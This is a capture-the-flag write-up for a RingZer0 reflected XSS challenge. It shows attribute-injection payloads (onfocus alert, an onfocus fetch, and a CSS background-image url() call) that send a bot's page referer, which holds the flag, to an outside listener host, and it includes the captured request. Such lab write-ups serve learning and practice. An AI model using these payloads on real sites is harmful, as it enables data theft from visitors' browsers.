# XSS Challenge 3 Solutions

The first payload I tried with was
```
abcd"<'
```
and viewing the page source for the response is the following:
```html
<!DOCTYPE html>
<html>
	<head>
		<title>RingZer0 Team Online CTF Challenge</title>
		<link rel="stylesheet" type="text/css" href="/css/main.css">
	</head>
	<body>
		<header></header>
		<div class="padding"><img src="/imgs/logo.png" /></div>
		<section>
			<br />
      <br />
      Your opinion matters to us again and again! Write some feedback.<br /><br />
      <form action="" method="post">
        Comment<br />
        <textarea name="comment"></textarea><br />
        <input type="submit" value="submit" />
      </form>
      <br /><input type="text" value="abcd"" /><br /><br />		
		</section>
		<div class="pre_footer"></div>
    <footer>RingZer0 Team 2022</footer>
	</body>
</html>
```

Essentially, this is how my payload was reflected in the document:
```html
<br /><input type="text" value="abcd"" /><br /><br />		
```

Looks like the `<` and `'` were sanitized out, but the double quotation mark was neither sanitized nor escaped.

I also tried the following payload 
```
abcd`
```
and it was reflected like
```
<br /><input type="text" value="abcd`" /><br /><br />	
```
So the `` ` `` character was also neither sanitized nor escaped.

Time to craft some XSS payloads. The first one I tried was:
```
abcd" autofocus onfocus="alert(1)
```
The `alert()` call got executed on my browser and the payload was reflected on the document like
```html
<br /><input type="text" value="abcd" autofocus onfocus="alert(1)" /><br /><br />	
```
The second payload I tried was:

```
abcd" autofocus onfocus="fetch(`http://mywebhooklistener.com`)
```

I got a request from my own browser, but nothing from the XSS bot.
Similar to a previous challenge, this is probably because the XSS bot doesn't support backticks or the Fetch API.

As a result, the same problem applies to any JS callback tricks I might use here, so I needed to start looking at other avenues. I was thinking about non-js things I can inject, and injecting CSS through the `style` attribute came to mind. As I was reading [this page](https://www.geeksforgeeks.org/html-style-attribute/) about the `style` attribute, I was reminded of the CSS `url()` function ([docs here](https://www.geeksforgeeks.org/css-url-function/)). After reading the docs, I used the following payload: 

```
" style="background-image:url(http://mywebhooklistener.com);
```
and I received the following request from the XSS Bot:
```
GET / HTTP/1.1
Referer: http://127.0.0.1/xss3/bot_endpoint_BD5XiO84TF.php?FLAG-[CENSORED]
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: mywebhooklistener.com
```
Flag received! :) 